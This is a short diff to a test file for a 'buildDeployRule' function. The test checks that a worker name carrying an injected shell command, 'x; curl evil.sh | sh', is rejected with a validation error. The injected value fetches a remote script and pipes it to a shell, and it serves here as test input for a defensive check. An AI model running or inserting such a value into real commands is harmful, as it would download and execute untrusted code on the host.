@@ -135,9 +135,15 @@ describe("buildDeployRule", () => {
   });
 
   it("refuses a name that would not be safe inside the deploy command", () => {
+    // As a bad input, not as a fault to report.
     expect(() =>
       buildDeployRule({ ...base, workerName: "x; curl evil.sh | sh" }),
-    ).toThrow(/Invalid Worker name/);
+    ).toThrow(
+      expect.objectContaining({
+        message: expect.stringMatching(/Invalid Worker name/),
+        kind: "validation",
+      }),
+    );
   });
 });
 
